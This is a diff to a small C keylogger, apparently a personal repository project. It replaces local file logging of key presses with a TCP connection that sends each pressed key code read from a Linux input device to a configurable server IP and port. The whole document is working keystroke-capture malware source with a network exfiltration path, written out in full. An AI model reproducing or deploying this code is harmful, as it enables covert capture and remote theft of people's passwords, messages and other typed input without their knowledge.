@@ -3,12 +3,17 @@
 #include <fcntl.h> //to open
 #include <unistd.h> //to read/write/close
 #include <linux/input.h> //for input_event struct
+#include <sys/socket.h> //sockets
+#include <arpa/inet.h>
+#include <string.h>
 
 int main(){
 	const char *device = "/dev/input/event13";
 	struct input_event event;
-	
+	char * SERVER_IP = "127.0.0.1"; //change it based on your pc
+	int SERVER_PORT = 7575;
 
+	//open keyboard event file
 	int keyboard_file  = open(device, O_RDONLY);
 	//open event file for keyboarads
 	if(keyboard_file  == -1){
@@ -16,36 +21,51 @@ int main(){
 		return 1;
 	}
 
-	//file to log key presses
-	FILE *logFile = fopen("/home/filetcow/repos/c-key-logger/keylog.txt","a");
+	//socket creation
+	int sock;
+	struct sockaddr_in server_addr;
+	char server_message[100];
 
-	if(logFile==NULL){
-		perror("error opening log file");
+	sock = socket(AF_INET, SOCK_STREAM,0);
+	if(sock<0){
+		perror("error creating a socket");
 		close(keyboard_file);
 		return 1;
 	}
-
+	//set server
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_port = htons(SERVER_PORT);
+	server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
 	
-	
-	while(1){
-		ssize_t bytes = read(keyboard_file, &event, sizeof(event));
-		if(bytes == (ssize_t) sizeof(event)){
-			if(event.type == EV_KEY){
-				if(event.value == 1){
-					printf("pressed %d\n",event.code);
-					fprintf(logFile, "Key pressed %d\n" , event.code);
-					fflush(logFile);
-					}
+	if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+	    perror("Error connecting to server");
+	    close(keyboard_file);
+   	    close(sock);
+   	     return 1;
 			}
+	printf("connected to server");
+	
+	
+
+
+
+
+	while(1){
+		//read keyboard-presses
+	ssize_t bytes = read(keyboard_file, &event , sizeof(event));
+	if(bytes == (ssize_t) sizeof(event)){
+		if(event.type == EV_KEY && event.value == 1) { //pressed key event
+			//prepare message
+			snprintf(server_message,sizeof(server_message),"%d",event.code);
+		       //sned to server
+		       if(send(sock,server_message,strlen(server_message),0)<0){
+		       		perror("error sending data to server");
+		 		break;
+		       }
 		}
 	}
-
-	fclose(logFile);
-	close(keyboard_file);
-	return 0;
-
 }
-
-
-		
-
+	close(keyboard_file);
+	close(sock);
+	return 0;
+}
